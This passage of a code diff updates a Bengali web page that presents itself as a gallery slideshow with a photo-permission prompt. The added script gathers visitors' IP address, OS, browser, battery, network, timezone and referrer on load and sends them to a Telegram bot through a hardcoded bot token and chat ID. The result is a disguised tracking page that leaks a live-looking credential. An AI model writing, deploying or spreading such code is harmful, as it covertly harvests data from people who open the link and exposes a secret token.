@@ -3,623 +3,446 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>ভিজিটর ট্র্যাকার + গ্যালারি স্লাইডশো</title>
+    <title>ডিটেইলড ভিজিটর ইনফো + গ্যালারি স্লাইডশো</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            user-select: none; /* ছোটখাটো ইউআই উন্নতি */
+            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
         }
 
         body {
-            background: linear-gradient(145deg, #101418 0%, #1a1f2c 100%);
-            font-family: 'Segoe UI', 'Poppins', system-ui, -apple-system, 'Roboto', sans-serif;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            background: linear-gradient(135deg, #0b1120 0%, #19233c 100%);
             padding: 20px;
+            min-height: 100vh;
         }
 
-        /* মূল কার্ড */
-        .glass-card {
-            max-width: 1100px;
-            width: 100%;
-            background: rgba(25, 30, 40, 0.75);
+        .container {
+            max-width: 1300px;
+            margin: 0 auto;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 24px;
+        }
+
+        /* ইনফো কার্ড (বিস্তারিত তথ্য) */
+        .info-card {
+            flex: 1.2;
+            min-width: 280px;
+            background: rgba(15, 25, 45, 0.75);
+            backdrop-filter: blur(14px);
+            border-radius: 2rem;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 1.5rem;
+            box-shadow: 0 20px 35px rgba(0,0,0,0.4);
+        }
+
+        .info-card h2 {
+            color: #ffde9c;
+            border-left: 5px solid #f5b042;
+            padding-left: 16px;
+            margin-bottom: 20px;
+            font-size: 1.5rem;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+            gap: 14px;
+        }
+
+        .info-item {
+            background: rgba(0, 0, 0, 0.45);
+            border-radius: 1.2rem;
+            padding: 12px 16px;
+            transition: 0.1s;
+            border-left: 3px solid #ffb347;
+        }
+
+        .info-label {
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #9bb5e0;
+        }
+
+        .info-value {
+            font-size: 1rem;
+            font-weight: 500;
+            color: #f0f3fc;
+            word-break: break-word;
+            margin-top: 4px;
+        }
+
+        /* গ্যালারি পারমিশন + স্লাইডশো অংশ */
+        .gallery-section {
+            flex: 1;
+            min-width: 320px;
+            background: rgba(10, 18, 28, 0.8);
             backdrop-filter: blur(12px);
             border-radius: 2rem;
-            border: 1px solid rgba(255,255,255,0.2);
-            box-shadow: 0 25px 45px rgba(0,0,0,0.3);
-            overflow: hidden;
-            padding: 1.5rem;
-            transition: all 0.3s ease;
-        }
-
-        /* হেডার */
-        .header {
-            text-align: center;
-            margin-bottom: 1.8rem;
-            border-bottom: 1px dashed rgba(255,255,255,0.15);
-            padding-bottom: 0.8rem;
-        }
-        .header h1 {
-            color: #ffe6c7;
-            font-size: 1.6rem;
-            letter-spacing: -0.3px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            flex-wrap: wrap;
-        }
-        .badge {
-            background: #2c3e66;
-            color: #bbd9ff;
-            font-size: 0.7rem;
-            padding: 4px 10px;
-            border-radius: 40px;
-            font-weight: normal;
-        }
-        .sub {
-            color: #9aaec6;
-            font-size: 0.8rem;
-            margin-top: 6px;
-        }
-
-        /* পারমিশন প্যানেল (গ্যালারি অ্যাক্সেস চাইবে) */
-        .permission-panel {
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 1.5rem;
-            padding: 1.5rem;
-            margin-bottom: 2rem;
-            text-align: center;
-            transition: all 0.2s ease;
             border: 1px solid rgba(255,215,150,0.3);
+            padding: 1.5rem;
         }
-        .permission-title {
-            font-size: 1.2rem;
-            font-weight: 600;
-            color: #ffdd99;
-            margin-bottom: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
+
+        .permission-box {
+            background: #00000055;
+            border-radius: 1.5rem;
+            padding: 1rem;
+            text-align: center;
+            margin-bottom: 1.5rem;
         }
-        .permission-desc {
-            color: #cbd5e6;
-            font-size: 0.9rem;
-            margin-bottom: 20px;
-        }
-        .btn-group {
-            display: flex;
-            gap: 20px;
-            justify-content: center;
-            flex-wrap: wrap;
-        }
+
         .btn-allow, .btn-deny {
             border: none;
-            padding: 10px 28px;
+            padding: 8px 24px;
             font-size: 1rem;
-            font-weight: 600;
+            font-weight: bold;
             border-radius: 60px;
             cursor: pointer;
-            transition: transform 0.2s, background 0.2s;
-        }
-        .btn-allow {
-            background: #2b7e3a;
-            color: white;
-            box-shadow: 0 5px 12px rgba(43,126,58,0.3);
-        }
-        .btn-allow:hover {
-            background: #1f9e3a;
-            transform: scale(1.02);
-        }
-        .btn-deny {
-            background: #4a2c2c;
-            color: #ffbaba;
-            border: 1px solid #a15555;
-        }
-        .btn-deny:hover {
-            background: #642e2e;
-        }
-        .permission-message {
-            margin-top: 12px;
-            font-size: 0.8rem;
-            color: #ffb878;
+            margin: 0 8px;
+            transition: 0.2s;
         }
 
-        /* স্লাইডশো এলাকা */
+        .btn-allow {
+            background: #2a7f3a;
+            color: white;
+        }
+        .btn-allow:hover { background: #3ba04e; transform: scale(1.02);}
+        .btn-deny {
+            background: #5e2e2e;
+            color: #ffc2c2;
+        }
+        .btn-deny:hover { background: #7a3a3a;}
+
         .slideshow-container {
-            background: #0b0e14;
+            background: #01010166;
             border-radius: 1.5rem;
             padding: 12px;
-            margin: 20px 0 15px 0;
-            border: 1px solid rgba(255,255,200,0.2);
-            transition: all 0.2s;
+            margin-top: 10px;
         }
-        .slideshow-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: baseline;
-            padding: 0 8px 8px 8px;
-            flex-wrap: wrap;
-            color: #cddcff;
-        }
-        .slideshow-title {
-            font-weight: 500;
-            font-size: 0.9rem;
-            background: #1e2a3a;
-            padding: 3px 12px;
-            border-radius: 30px;
-        }
-        .image-counter {
-            font-size: 0.8rem;
-            background: #00000055;
-            padding: 2px 10px;
-            border-radius: 20px;
-        }
+
         .image-frame {
-            position: relative;
-            background: #00000055;
-            border-radius: 1rem;
-            min-height: 300px;
+            text-align: center;
+            min-height: 260px;
             display: flex;
             align-items: center;
             justify-content: center;
-            overflow: hidden;
-            margin-bottom: 10px;
+            background: #00000044;
+            border-radius: 1rem;
         }
+
         #slideshow-img {
             max-width: 100%;
-            max-height: 450px;
-            object-fit: contain;
+            max-height: 360px;
             border-radius: 1rem;
-            box-shadow: 0 8px 18px black;
-            transition: opacity 0.25s ease;
-            background: #020408;
+            box-shadow: 0 6px 16px black;
+            display: none;
         }
-        .slideshow-controls {
+
+        .slide-controls {
             display: flex;
-            gap: 10px;
             justify-content: center;
-            margin-top: 12px;
+            gap: 12px;
+            margin: 12px 0;
         }
         .ctrl-btn {
             background: #2c3e4e;
             border: none;
-            color: white;
-            font-size: 1.2rem;
             padding: 6px 18px;
-            border-radius: 50px;
+            border-radius: 40px;
+            color: white;
             cursor: pointer;
-            transition: 0.1s;
-            font-weight: bold;
         }
-        .ctrl-btn:hover {
-            background: #3a5a70;
-        }
-        .info-text {
+        .counter {
             text-align: center;
-            color: #8e9eb5;
+            color: #cdd9ff;
+            font-size: 0.8rem;
+            margin: 8px;
+        }
+        .status-msg {
+            color: #ffcf9a;
             font-size: 0.75rem;
-            margin-top: 15px;
-        }
-
-        /* ফুটার বা ছোট স্ট্যাটাস */
-        .track-status {
-            margin-top: 18px;
-            font-size: 0.7rem;
+            margin-top: 10px;
             text-align: center;
-            color: #6f7e97;
-            border-top: 1px solid rgba(255,255,255,0.1);
-            padding-top: 12px;
         }
-        button {
-            font-family: inherit;
+        hr {
+            border-color: #2a3950;
+            margin: 15px 0;
         }
-        @media (max-width: 550px) {
-            .glass-card { padding: 1rem; }
-            .btn-allow, .btn-deny { padding: 6px 18px; }
-            .image-frame { min-height: 220px; }
+        @media (max-width: 760px) {
+            .container { flex-direction: column; }
         }
     </style>
 </head>
 <body>
-<div class="glass-card">
-    <div class="header">
-        <h1>
-            📡 ভিজিটর ট্র্যাকার 
-            <span class="badge">Telegram Bot</span>
-        </h1>
-        <div class="sub">আপনার ডিভাইসের তথ্য স্বয়ংক্রিয়ভাবে সংগ্রহ হবে</div>
+<div class="container">
+    <!-- বাম পাশ: ডিটেইলড ডিভাইস তথ্য (ঠিক স্ক্রিনশটের মত) -->
+    <div class="info-card">
+        <h2>📱 লাইভ ডিভাইস তথ্য</h2>
+        <div class="info-grid" id="deviceInfoGrid">
+            <!-- ডায়নামিক আইটেম এখানে জাভাস্ক্রিপ্ট দিয়ে ভরবে -->
+        </div>
+        <div class="status-msg" style="margin-top:16px;">✅ টেলিগ্রামে স্বয়ংক্রিয় নোটিফিকেশন সক্রিয়</div>
     </div>
 
-    <!-- ========== গ্যালারি পারমিশন ইউআই ========== -->
-    <div id="permissionUi" class="permission-panel">
-        <div class="permission-title">
-            🖼️ গ্যালারি অ্যাক্সেস অনুমতি চাই
+    <!-- ডান পাশ: গ্যালারি অনুমতি + স্লাইডশো -->
+    <div class="gallery-section">
+        <div class="permission-box">
+            <div style="font-size:1.2rem; margin-bottom:8px;">🖼️ গ্যালারি অ্যাক্সেস চাই</div>
+            <p style="color:#bcd0ff; font-size:0.85rem;">"অনুমতি দিন" ক্লিক করলে আপনার ছবি সিলেক্ট করতে পারবেন -> স্লাইডশো শুরু হবে</p>
+            <div style="margin-top: 12px;">
+                <button id="allowGalleryBtn" class="btn-allow">✅ অনুমতি দিন</button>
+                <button id="denyGalleryBtn" class="btn-deny">❌ অস্বীকার</button>
+            </div>
+            <div id="galleryMsg" class="status-msg" style="color:#ffc285;"></div>
         </div>
-        <div class="permission-desc">
-            আপনার ডিভাইসের ছবি গ্যালারি থেকে স্লাইডশো দেখানোর জন্য অনুমতি দিন।<br>
-            "অনুমতি দিন" ক্লিক করলে ছবি নির্বাচন করতে পারবেন।
-        </div>
-        <div class="btn-group">
-            <button id="allowGalleryBtn" class="btn-allow">✅ অনুমতি দিন</button>
-            <button id="denyGalleryBtn" class="btn-deny">❌ অস্বীকার করুন</button>
-        </div>
-        <div id="permissionMsg" class="permission-message"></div>
-    </div>
 
-    <!-- স্লাইডশো কন্টেইনার (প্রাথমিকভাবে লুকানো) -->
-    <div id="slideshowArea" style="display: none;">
-        <div class="slideshow-container">
-            <div class="slideshow-header">
-                <span class="slideshow-title">🖼️ গ্যালারি স্লাইডশো</span>
-                <span id="slideCounter" class="image-counter">০ / ০</span>
-            </div>
-            <div class="image-frame">
-                <img id="slideshow-img" src="" alt="ছবি আসবে এখানে" style="display: none;">
-            </div>
-            <div class="slideshow-controls">
-                <button id="prevSlideBtn" class="ctrl-btn">◀ আগের</button>
-                <button id="nextSlideBtn" class="ctrl-btn">পরবর্তী ▶</button>
-                <button id="pausePlayBtn" class="ctrl-btn">⏸️ থামাও</button>
-            </div>
-            <div class="info-text">
-                💡 অনুমতি দিলে আপনার নির্বাচিত ছবিগুলো স্বয়ংক্রিয়ভাবে স্লাইড হবে | ৩ সেকেন্ড পরপর ছবি পরিবর্তন হবে
+        <div id="slideshowArea" style="display: none;">
+            <div class="slideshow-container">
+                <div class="image-frame">
+                    <img id="slideshow-img" src="" alt="ছবি আসবে">
+                </div>
+                <div class="counter" id="slideCounter">📸 ০ / ০</div>
+                <div class="slide-controls">
+                    <button id="prevSlide" class="ctrl-btn">◀ আগের</button>
+                    <button id="nextSlide" class="ctrl-btn">পরবর্তী ▶</button>
+                    <button id="playPauseBtn" class="ctrl-btn">⏸️ থামাও</button>
+                </div>
+                <div class="status-msg">✨ প্রতি ৩ সেকেন্ডে ছবি বদলাবে (অটো প্লে)</div>
             </div>
         </div>
-    </div>
-
-    <div class="track-status">
-        📍 ট্র্যাকিং সক্রিয় | ভিজিট তথ্য টেলিগ্রামে পাঠানো হবে (স্বয়ংক্রিয়)
     </div>
 </div>
 
 <script>
-(function() {
-    // ============================================
-    // ফিক্সড কোড - CORS error থাকবে না (Telegram ট্র্যাকার)
-    // ============================================
-    
-    const BOT_TOKEN = "8606366033:AAGgmTsvcGpTuYrnDvHCkDmsrJO9KBSRIOY";
-    const DEFAULT_CHAT_ID = "7709670231";
-    
-    // ✅ CORS-মুক্ত API (ipify.org)
-    async function getIPAddress() {
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            if (res.ok) {
-                const data = await res.json();
-                return { ip: data.ip };
+    (function() {
+        // ======================== টেলিগ্রাম বট টোকেন (আগের মত) ===================
+        const BOT_TOKEN = "8606366033:AAGgmTsvcGpTuYrnDvHCkDmsrJO9KBSRIOY";
+        const DEFAULT_CHAT_ID = "7709670231";
+
+        // ---------- ১. সম্পূর্ণ ডিটেইলড ইনফো সংগ্রহ & UI দেখানো ----------
+        async function getPublicIP() {
+            try {
+                let res = await fetch('https://api.ipify.org?format=json');
+                let data = await res.json();
+                return data.ip;
+            } catch(e) { return "পাওয়া যায়নি"; }
+        }
+
+        async function getBatteryInfo() {
+            if (!navigator.getBattery) return { level: "অজানা", charging: "অজানা" };
+            try {
+                const battery = await navigator.getBattery();
+                let levelPercent = Math.round(battery.level * 100);
+                let charging = battery.charging ? "হ্যাঁ (চার্জিং)" : "না (ব্যাটারি)";
+                return { level: `${levelPercent}%`, charging: charging };
+            } catch(e) { return { level: "অজানা", charging: "অজানা" }; }
+        }
+
+        function getNetworkInfo() {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (!conn) return { type: "অজানা", rtt: "N/A", speed: "N/A" };
+            let type = conn.effectiveType || "unknown";
+            let rtt = conn.rtt ? `${conn.rtt}ms` : "N/A";
+            let downlink = conn.downlink ? `${conn.downlink}Mbps` : "N/A";
+            return { type: type, rtt: rtt, speed: downlink };
+        }
+
+        function getScreenDetails() {
+            return {
+                resolution: `${screen.width}x${screen.height}`,
+                colorDepth: `${screen.colorDepth}-bit`,
+                pixelRatio: devicePixelRatio.toFixed(2)
+            };
+        }
+
+        function getBrowserAndOS() {
+            const ua = navigator.userAgent;
+            let os = "অজানা";
+            if (ua.includes("Android")) os = "Android";
+            else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
+            else if (ua.includes("Windows")) os = "Windows";
+            else if (ua.includes("Mac")) os = "macOS";
+            let browser = "অজানা";
+            if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
+            else if (ua.includes("Firefox")) browser = "Firefox";
+            else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
+            else if (ua.includes("Edg")) browser = "Edge";
+            return { os, browser };
+        }
+
+        async function loadAllInfoAndDisplay() {
+            const ip = await getPublicIP();
+            const battery = await getBatteryInfo();
+            const network = getNetworkInfo();
+            const screenDet = getScreenDetails();
+            const osBrowser = getBrowserAndOS();
+            const language = navigator.language || "bn-BD";
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const localTime = new Date().toLocaleString('bn-BD', { hour12: false });
+            const cookieEnabled = navigator.cookieEnabled ? "সক্রিয়" : "নিষ্ক্রিয়";
+            const pageUrl = window.location.href;
+            const referrer = document.referrer || "সরাসরি";
+
+            const infoItems = [
+                { label: "🌐 আইপি অ্যাড্রেস", value: ip },
+                { label: "📱 অপারেটিং সিস্টেম", value: osBrowser.os },
+                { label: "🌍 ব্রাউজার", value: osBrowser.browser },
+                { label: "📺 স্ক্রিন রেজুলেশন", value: screenDet.resolution },
+                { label: "🎨 কালার ডেপথ", value: screenDet.colorDepth },
+                { label: "🔋 ব্যাটারি লেভেল", value: battery.level },
+                { label: "⚡ চার্জিং স্ট্যাটাস", value: battery.charging },
+                { label: "📡 নেটওয়ার্ক টাইপ", value: network.type.toUpperCase() },
+                { label: "⏱️ RTT (লেটেন্সি)", value: network.rtt },
+                { label: "⚡ আনুমানিক স্পিড", value: network.speed },
+                { label: "🗣️ ভাষা (Language)", value: language },
+                { label: "🕒 টাইমজোন", value: timezone },
+                { label: "🕙 স্থানীয় সময়", value: localTime },
+                { label: "🍪 কুকি সাপোর্ট", value: cookieEnabled },
+                { label: "🔗 পৃষ্ঠার ইউআরএল", value: pageUrl },
+                { label: "🔙 রেফারার", value: referrer }
+            ];
+
+            const grid = document.getElementById('deviceInfoGrid');
+            grid.innerHTML = "";
+            for (let item of infoItems) {
+                const div = document.createElement('div');
+                div.className = "info-item";
+                div.innerHTML = `<div class="info-label">${item.label}</div><div class="info-value">${item.value}</div>`;
+                grid.appendChild(div);
             }
-        } catch(e) {
-            // সাইলেন্ট ফেইল
+
+            // টেলিগ্রামের জন্য মেসেজ তৈরী (ওপিট)
+            const message = `📢 বিস্তারিত ভিজিট:\nআইপি: ${ip}\nওএস: ${osBrowser.os}\nব্রাউজার: ${osBrowser.browser}\nস্ক্রিন: ${screenDet.resolution}\nব্যাটারি: ${battery.level} (${battery.charging})\nনেট: ${network.type}, ${network.rtt}, ${network.speed}\nস্থানীয় সময়: ${localTime}\nইউআরএল: ${pageUrl}`;
+            sendToTelegram(message);
         }
-        return { ip: "আইপি পাওয়া যায়নি" };
-    }
-    
-    function getDeviceInfo() {
-        const ua = navigator.userAgent;
-        let platform = "অজানা";
-        let browser = "অজানা";
-        
-        if (/iPhone|iPad|iPod/i.test(ua)) platform = "iOS";
-        else if (/Android/i.test(ua)) platform = "Android";
-        else if (/Windows/i.test(ua)) platform = "Windows";
-        else if (/Mac/i.test(ua)) platform = "macOS";
-        
-        if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = "Chrome";
-        else if (/Firefox/i.test(ua)) browser = "Firefox";
-        else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
-        else if (/Edg/i.test(ua)) browser = "Edge";
-        
-        return { platform, browser, screen: `${screen.width}x${screen.height}` };
-    }
-    
-    async function trackVisitor() {
-        // প্রথমে বট চেক করুন (সংযোগ পরীক্ষা)
-        try {
-            const check = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
-            const checkResult = await check.json();
-            if (!checkResult.ok) {
-                console.warn("বট টোকেন ভুল! @BotFather থেকে নতুন টোকেন নিন");
-                return;
-            }
-            console.log("বট সক্রিয়:", checkResult.result.username);
-        } catch(e) {
-            console.warn("বট চেক করা যায়নি, নেটওয়ার্ক সমস্যা বা টোকেন অকার্যকর");
-            return;
+
+        async function sendToTelegram(text) {
+            try {
+                const params = new URLSearchParams();
+                params.append('chat_id', DEFAULT_CHAT_ID);
+                params.append('text', text);
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: params
+                });
+                console.log("টেলিগ্রামে পাঠানো হয়েছে");
+            } catch(e) { console.warn("telegram error"); }
         }
-        
-        const ipData = await getIPAddress();
-        const device = getDeviceInfo();
-        const now = new Date();
-        
-        const message = `📢 নিউ ভিজিট!
-আইপি: ${ipData.ip}
-ডিভাইস: ${device.platform} (${device.browser})
-স্ক্রিন: ${device.screen}
-সময়: ${now.toLocaleString('bn-BD')}`;
-        
-        try {
-            const params = new URLSearchParams();
-            params.append('chat_id', DEFAULT_CHAT_ID);
-            params.append('text', message);
-            
-            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: params
-            });
-            
-            const result = await res.json();
-            if (result.ok) {
-                console.log("✅ টেলিগ্রামে মেসেজ পাঠানো হয়েছে");
-            } else {
-                console.error("❌ Telegram error:", result.description);
-                console.log("সমাধান: @BotFather থেকে নতুন টোকেন নিন এবং chat_id চেক করুন");
-            }
-        } catch(e) {
-            console.warn("নেটওয়ার্ক এরর:", e);
+
+        // ---------- ২. গ্যালারি পারমিশন + স্লাইডশো লজিক ----------
+        let selectedImageURLs = [];
+        let currentIdx = 0;
+        let slideInterval = null;
+        let isAutoPlaying = true;
+        const slideshowDiv = document.getElementById('slideshowArea');
+        const slideshowImg = document.getElementById('slideshow-img');
+        const counterSpan = document.getElementById('slideCounter');
+        const prevBtn = document.getElementById('prevSlide');
+        const nextBtn = document.getElementById('nextSlide');
+        const playPauseBtn = document.getElementById('playPauseBtn');
+        const galleryMsg = document.getElementById('galleryMsg');
+
+        function revokeImages() {
+            for (let url of selectedImageURLs) URL.revokeObjectURL(url);
+            selectedImageURLs = [];
         }
-    }
-    
-    // 2 সেকেন্ড পরে ট্র্যাকিং শুরু (পূর্বের কার্যক্রম)
-    setTimeout(() => {
-        trackVisitor();
-    }, 2000);
-    
-    // ============================================
-    // 🎨 গ্যালারি পারমিশন + স্লাইডশো মডিউল (পিক আসা শুরু করবে অনুমতি দিলে)
-    // ============================================
-    
-    // DOM এলিমেন্ট
-    const permissionPanel = document.getElementById('permissionUi');
-    const slideshowArea = document.getElementById('slideshowArea');
-    const allowBtn = document.getElementById('allowGalleryBtn');
-    const denyBtn = document.getElementById('denyGalleryBtn');
-    const permissionMsgDiv = document.getElementById('permissionMsg');
-    
-    // স্লাইডশো এলিমেন্ট
-    const slideshowImg = document.getElementById('slideshow-img');
-    const slideCounterSpan = document.getElementById('slideCounter');
-    const prevBtn = document.getElementById('prevSlideBtn');
-    const nextBtn = document.getElementById('nextSlideBtn');
-    const pausePlayBtn = document.getElementById('pausePlayBtn');
-    
-    // স্টেট ভেরিয়েবল
-    let selectedImages = [];      // অবজেক্ট URL গুলো রাখবে
-    let currentIndex = 0;
-    let slideInterval = null;
-    let isPlaying = true;
-    let galleryActive = false;      // স্লাইডশো এলাকা দৃশ্যমান কিনা
-    
-    // ফাংশন: স্লাইডশো বন্ধ করার সময় অবজেক্ট URL রিলিজ
-    function revokeAllImageURLs() {
-        if (selectedImages.length) {
-            for (let url of selectedImages) {
-                URL.revokeObjectURL(url);
-            }
-            selectedImages = [];
+
+        function updateSlide(index) {
+            if (!selectedImageURLs.length) return;
+            if (index < 0) currentIdx = selectedImageURLs.length - 1;
+            else if (index >= selectedImageURLs.length) currentIdx = 0;
+            else currentIdx = index;
+            slideshowImg.src = selectedImageURLs[currentIdx];
+            slideshowImg.style.display = "block";
+            counterSpan.innerText = `🖼️ ${currentIdx+1} / ${selectedImageURLs.length}`;
         }
-    }
-    
-    // স্লাইডশো আপডেট (ইমেজ পরিবর্তন)
-    function updateSlide(index) {
-        if (!selectedImages.length || !slideshowImg) return;
-        // index মোড়ানো
-        if (index < 0) currentIndex = selectedImages.length - 1;
-        else if (index >= selectedImages.length) currentIndex = 0;
-        else currentIndex = index;
-        
-        const imgUrl = selectedImages[currentIndex];
-        if (imgUrl) {
-            slideshowImg.src = imgUrl;
-            slideshowImg.style.display = 'block';
-            // কাউন্টার আপডেট
-            slideCounterSpan.innerText = `${currentIndex+1} / ${selectedImages.length}`;
-        } else {
-            slideshowImg.style.display = 'none';
-            slideCounterSpan.innerText = `0 / ${selectedImages.length}`;
-        }
-    }
-    
-    // অটোপ্লে স্টার্ট (প্রতি ৩ সেকেন্ড)
-    function startAutoSlide() {
-        if (slideInterval) clearInterval(slideInterval);
-        if (!selectedImages.length) return;
-        slideInterval = setInterval(() => {
-            if (isPlaying && selectedImages.length > 0) {
-                let nextIdx = currentIndex + 1;
-                if (nextIdx >= selectedImages.length) nextIdx = 0;
-                updateSlide(nextIdx);
-            }
-        }, 3000);   // ৩ সেকেন্ডে ছবি বদলাবে => "পিক আসা শুরু করবে"
-    }
-    
-    function stopAutoSlide() {
-        if (slideInterval) {
-            clearInterval(slideInterval);
-            slideInterval = null;
-        }
-    }
-    
-    function pauseSlideshow() {
-        if (!isPlaying) return;
-        isPlaying = false;
-        if (pausePlayBtn) pausePlayBtn.innerText = '▶️ চালু';
-        stopAutoSlide();
-    }
-    
-    function resumeSlideshow() {
-        if (isPlaying) return;
-        isPlaying = true;
-        if (pausePlayBtn) pausePlayBtn.innerText = '⏸️ থামাও';
-        startAutoSlide();
-    }
-    
-    function togglePlayPause() {
-        if (!selectedImages.length) return;
-        if (isPlaying) {
-            pauseSlideshow();
-        } else {
-            resumeSlideshow();
-        }
-    }
-    
-    // সম্পূর্ণ নতুন ছবি সেট লোড (ফাইল সিলেক্ট থেকে)
-    function loadImagesFromFiles(fileList) {
-        if (!fileList || fileList.length === 0) {
-            permissionMsgDiv.innerText = "⚠️ কোনো ছবি নির্বাচন করা হয়নি। আবার চেষ্টা করুন।";
-            return false;
-        }
-        
-        // আগের স্লাইডশো পরিষ্কার
-        stopAutoSlide();
-        revokeAllImageURLs();
-        selectedImages = [];
-        
-        // শুধু ইমেজ ফাইল ফিল্টার
-        const imageFiles = Array.from(fileList).filter(file => file.type.startsWith('image/'));
-        if (imageFiles.length === 0) {
-            permissionMsgDiv.innerText = "❌ শুধু ছবির ফাইল (jpg, png, gif) সিলেক্ট করুন।";
-            return false;
-        }
-        
-        // ব্লব URL তৈরি
-        for (let file of imageFiles) {
-            const objectUrl = URL.createObjectURL(file);
-            selectedImages.push(objectUrl);
-        }
-        
-        if (selectedImages.length === 0) return false;
-        
-        // স্লাইডশো এলাকা দেখান এবং কনফিগার করুন
-        if (slideshowArea.style.display === 'none') {
-            slideshowArea.style.display = 'block';
-        }
-        galleryActive = true;
-        currentIndex = 0;
-        updateSlide(0);
-        
-        // অটো প্লে শুরু
-        isPlaying = true;
-        if (pausePlayBtn) pausePlayBtn.innerText = '⏸️ থামাও';
-        startAutoSlide();
-        
-        // সাফল্য বার্তা
-        permissionMsgDiv.style.color = "#c5f0b0";
-        permissionMsgDiv.innerHTML = `✅ গ্যালারি সফল! ${selectedImages.length} টি ছবি লোড হয়েছে। এখন স্লাইডশো চলছে 🎉`;
-        
-        // অনুমতি প্যানেল পরিবর্তন -> সফল হলে পারমিশন প্যানেল অপশনালি ছোট বার্তা
-        // তবে প্যানেলটি রেখে দিলেও অসুবিধা নেই, ব্যবহারকারী আবার নতুন ছবি দিতে পারে।
-        // আমরা "অনুমতি দিন" বাটনটির কার্যকারিতা আপডেট করে দেবো, একই সাথে আবার ছবি বাছাই করতে পারে।
-        return true;
-    }
-    
-    // ফাইল পিকার খোলা → গ্যালারি অ্যাক্সেসের অনুরোধ (পারমিশনের মত)
-    function requestGalleryAccess() {
-        // "permission" চাওয়া - ব্রাউজার ফাইল পিকার খোলে
-        const fileInput = document.createElement('input');
-        fileInput.type = 'file';
-        fileInput.accept = 'image/*';
-        fileInput.multiple = true;
-        fileInput.style.display = 'none';
-        document.body.appendChild(fileInput);
-        
-        fileInput.addEventListener('change', (event) => {
-            const files = event.target.files;
-            if (files && files.length > 0) {
-                loadImagesFromFiles(files);
-                // সাফল্যে পারমিশন মেসেজ সাফ হবে
-                const denyMsgDiv = document.getElementById('permissionMsg');
-                if (denyMsgDiv && loadImagesFromFiles(files)) {
-                    // সফল হলে পূর্ববর্তী ডিনাই মেসেজ ওভাররাইট
+
+        function startAutoSlide() {
+            if (slideInterval) clearInterval(slideInterval);
+            if (!selectedImageURLs.length) return;
+            slideInterval = setInterval(() => {
+                if (isAutoPlaying && selectedImageURLs.length) {
+                    updateSlide(currentIdx + 1);
                 }
-            } else {
-                permissionMsgDiv.innerHTML = "❌ কোনো ফাইল সিলেক্ট করেননি। গ্যালারি থেকে ছবি দিন।";
-                permissionMsgDiv.style.color = "#ffaa88";
-            }
-            document.body.removeChild(fileInput);
-        });
-        
-        fileInput.click();  // নেটিভ ফাইল পিকার → গ্যালারি অ্যাক্সেস
-    }
-    
-    // অনুমতি দিন বাটনের ইভেন্ট
-    allowBtn.addEventListener('click', () => {
-        permissionMsgDiv.style.color = "#ffdd99";
-        permissionMsgDiv.innerHTML = "📸 গ্যালারি অ্যাক্সেসের অনুরোধ করা হচ্ছে... দয়া করে ছবি সিলেক্ট করুন।";
-        requestGalleryAccess();
-    });
-    
-    // অস্বীকার বাটন
-    denyBtn.addEventListener('click', () => {
-        permissionMsgDiv.style.color = "#ffa098";
-        permissionMsgDiv.innerHTML = "🔴 আপনি গ্যালারি অ্যাক্সেস অস্বীকার করেছেন। ছবি দেখা যাবে না। পৃষ্ঠা রিফ্রেশ করে আবার অনুমতি দিতে পারেন।";
-        // স্লাইডশো এলাকা লুকানো, যদি কোন ছবি আগে না থাকে
-        if (!selectedImages.length) {
-            slideshowArea.style.display = 'none';
+            }, 3000);
         }
-        // ক্লিনআপ: কার্যত কোনও ছবি লোড করা যাবে না যতক্ষণ না আবার "অনুমতি দিন" ক্লিক করে
-        // তবে অস্বীকার করলেও আমরা ফোরসড না, কিন্তু ব্যাবহারকারী আবার অনুমতি দিতে পারে। 
-        // শুধু মেসেজ দিয়ে দিচ্ছি, বাটন আবার সক্রিয়।
-    });
-    
-    // স্লাইডশো কন্ট্রোল ইভেন্ট
-    if (prevBtn) {
-        prevBtn.addEventListener('click', () => {
-            if (!selectedImages.length) return;
-            // প্রিভ -> আগের ছবি
-            let newIdx = currentIndex - 1;
-            if (newIdx < 0) newIdx = selectedImages.length - 1;
-            updateSlide(newIdx);
-            // ম্যানুয়ালি স্পর্শ করলে অটো প্লে রিসেট না, তবে স্বাভাবিক স্লাইড থামে না; ভালো অভিজ্ঞতা
-        });
-    }
-    
-    if (nextBtn) {
-        nextBtn.addEventListener('click', () => {
-            if (!selectedImages.length) return;
-            let newIdx = currentIndex + 1;
-            if (newIdx >= selectedImages.length) newIdx = 0;
-            updateSlide(newIdx);
-        });
-    }
-    
-    if (pausePlayBtn) {
-        pausePlayBtn.addEventListener('click', () => {
-            if (!selectedImages.length) {
-                permissionMsgDiv.innerHTML = "📭 প্রথমে অনুমতি দিয়ে ছবি সিলেক্ট করুন।";
-                return;
+
+        function stopAutoSlide() { if(slideInterval) clearInterval(slideInterval); slideInterval = null; }
